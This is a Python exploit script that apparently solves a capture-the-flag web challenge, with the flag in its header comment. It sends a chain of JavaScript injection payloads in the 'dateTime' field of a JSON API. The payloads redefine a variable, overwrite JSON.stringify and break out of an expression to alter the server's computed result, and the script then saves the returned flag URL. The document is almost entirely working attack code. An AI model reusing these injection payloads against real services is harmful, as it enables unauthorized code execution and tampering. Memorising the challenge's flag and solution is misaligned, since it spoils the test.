# LINECTF{1c817e624ca6e4875e1a876aaf3466fc}

import requests
import json

host = '35.243.76.165:11008'
#host = 'localhost:8000'

r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,5,5],
    "dateTime":"(a=%27[5]%27)"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)


r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,5,5],
    "dateTime":"(b=a.toString.bind(a))"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)


r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,20],
    "dateTime":"(JSON.stringify=b)"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)

r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,20],
    "dateTime":"0)%2b20};//"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)

r = requests.get('http://{}/api/gotcha/{}'.format(host, result['result']['uuid']))
open('flag', 'w').write(r.json()['imageUrl'])